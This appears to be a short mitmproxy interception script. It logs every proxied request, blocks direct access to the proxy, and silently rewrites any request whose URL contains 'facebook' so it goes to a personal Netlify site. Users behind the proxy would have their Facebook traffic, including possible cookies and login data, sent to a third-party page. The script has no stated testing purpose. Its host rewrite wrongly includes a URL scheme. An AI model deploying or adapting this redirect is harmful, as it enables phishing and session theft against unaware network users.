# custom_mitmproxy_script.py
from mitmproxy import http

def request(flow: http.HTTPFlow) -> None:
    # Intercept traffic and modify as needed
    print("\n\n")
    print(flow.request.pretty_url)
    print(flow.request.host)
    print(flow.request.port)
    print( "facebook.com" in flow.request.pretty_url)

    proxy_ip = "192.168.1.72"  # Replace with your proxy's IP
    proxy_port = 8084            # Replace with your proxy's port

    # Check if the request is targeting the proxy itself
    if flow.request.host == proxy_ip and flow.request.port == proxy_port:
        # Respond with a custom message for direct access
        flow.response = http.Response.make(
            403,  # HTTP status code for "Forbidden"
            b"Direct access to the proxy is not allowed.",
            {"Content-Type": "text/plain"}
        )
    elif "facebook" in flow.request.pretty_url:
        # flow.request.host = "192.168.1.72"
        # flow.request.port = 5000
        flow.request.host = "https://belhanafiabdelmadjid.netlify.app"  # Replace with your actual Netlify URL
        flow.request.port = 443
        # flow.request.scheme = "https"

    # If accessing directly by IP and port
    # if flow.request.host == "192.168.1.100" and flow.request.port == 8080:
    #     # Respond with a custom message for direct access
    #     flow.response = http.Response.make(
    #         403,  # HTTP status code for "Forbidden"
    #         b"Direct access is not allowed",
    #         {"Content-Type": "text/plain"}
    #     )
    # elif "example.com" in flow.request.pretty_url:
    #     # Redirect example.com to the Flask server
    #     flow.request.host = "your_flask_server_ip"
    #     flow.request.port = 5000

